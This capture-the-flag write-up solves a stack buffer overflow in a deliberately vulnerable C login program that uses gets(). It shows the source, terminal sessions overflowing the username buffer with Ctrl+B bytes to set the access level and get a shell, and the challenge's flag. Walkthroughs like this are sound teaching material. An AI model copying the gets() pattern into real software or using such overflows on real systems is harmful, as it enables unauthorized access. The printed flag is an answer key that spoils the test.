Question:
>Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: /problems/5206d6e095708fbcc2dfa33cd2a8b819

Hints:
>What happens if you read in more characters than the length of the username buffer?
>You should look at an ascii table to see what character you need to choose.
>Numbers are stored in little-endian format, which means that the lowest byte of the number is first.
>"cat file - | vrgearconsole " will keep the pipe open for commands.

Here's the code for vrgearconsole.c:

```
                                                          
#include <stdlib.h>
#include <stdio.h>
                                                            
int login() {
    int accessLevel = 0xff;
    char username[16];
    char password[32];
    printf("Username (max 15 characters): ");
    gets(username);                                         
    printf("Password (max 31 characters): ");
    gets(password);                                         
                                                            
    if (!strcmp(username, "admin") && !strcmp(password, "{{ create_long_password() }}")) {
        accessLevel = 2;                                    
    } else if (!strcmp(username, "root") && !strcmp(password, "{{ create_long_password() }}")) {  
        accessLevel = 0;                                    
    } else if (!strcmp(username, "artist") && !strcmp(password, "my-password-is-secret")) {
        accessLevel = 0x80;                                 
    }                                                       
                                                            
    return accessLevel;
}                                                           
                                                            
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf(
    "+----------------------------------------+\n"
        "|                                        |\n"
        "|                                        |\n"
        "|                                        |\n"
        "|                                        |\n"
        "|  Welcome to the VR gear admin console  |\n"
        "|                                        |\n"
        "|                                        |\n"
        "|                                        |\n"
        "|                                        |\n"
        "+----------------------------------------+\n"
        "|                                        |\n"
        "|      Your account is not recognized    |\n"
        "|                                        |\n"
        "+----------------------------------------+\n"
        "\n\n\n\n"
        "Please login to continue...\n\n\n"
    );                                                      
    int access = login();
                                                            
    printf("Your access level is: 0x%08x\n", access);
                                                            
    if (access >= 0xff || access <= 0) {
        printf("Login unsuccessful.\n");
        exit(10);                                           
    } else if (access < 0x30) {
        printf("Admin access granted!\n");
        printf("The flag is in \"flag.txt\".\n");
        system("/bin/sh");
    } else {
        printf("Login successful.\n");
        printf("You do not have permission to access this resource.\n"); 
        exit(1);                                            
    }                                                       
}         
```

So, the program will assume access if `access` is less than `0x30` (48), but greater than 0.
There are 3 accounts we can log into: `admin`, `root`, and `artist`
If all we need is access, why do we need to log into the admin account? Everything we need to access the artist account is already hardcoded into the program. We can even access it:

```
$ ./vrgearconsole                                         
+----------------------------------------+                  
|                                        |                  
|                                        |                  
|                                        |                  
|                                        |                  
|  Welcome to the VR gear admin console  |                  
|                                        |                  
|                                        |                  
|                                        |                  
|                                        |                  
+----------------------------------------+                  
|                                        |                  
|      Your account is not recognized    |                  
|                                        |                  
+----------------------------------------+                  
                                                            
                                                            
                                                            
                                                            
Please login to continue...                                 
                                                            
                                                            
Username (max 15 characters): artist                        
Password (max 31 characters): my-password-is-secret         
Your access level is: 0x00000080                            
Login successful.                                           
You do not have permission to access this resource. 
$
```

Cool. We made it into the account. Now we just have to overwrite the access variable.
You may notice that this program uses `gets()` to retrieve data from the buffer. `gets()` is a very vulnerable way to do this because it basically reads until it finds a new line or hits an error. So, we can easily overflow the buffer.
Don't quote me on that, though.

Anyway, we want to use it to overwrite the `access` variable. Since the username buffer is shorter, I will overload it with ctrl+b. Ctrl+b has a hex code of 0x2, which is within the access range.

```
$ ./vrgearconsole                                         
+----------------------------------------+                  
|                                        |                  
|                                        |                  
|                                        |                  
|                                        |                  
|  Welcome to the VR gear admin console  |                  
|                                        |                  
|                                        |                  
|                                        |                  
|                                        |                  
+----------------------------------------+                  
|                                        |                  
|      Your account is not recognized    |                  
|                                        |                  
+----------------------------------------+                  
                                                            
                                                            
                                                            
                                                            
Please login to continue...                                 
                                                            
                                                            
Username (max 15 characters): artist^B^B^B^B^B^B^B^B^B^B^B  
Password (max 31 characters): my-password-is-secret         
Your access level is: 0x00000002                            
Admin access granted!                                       
The flag is in "flag.txt".                                  
$ ls                                                        
flag.txt  vrgearconsole  vrgearconsole.c                    
$ cat flag.txt                                              
2ec38579232114dd2d235f797030af43                                                                               
$ pwd                                                       
/problems/5206d6e095708fbcc2dfa33cd2a8b819
```
^B is the way that ctrl+b shows up in text form. 

Anyway, the flag is `2ec38579232114dd2d235f797030af43`
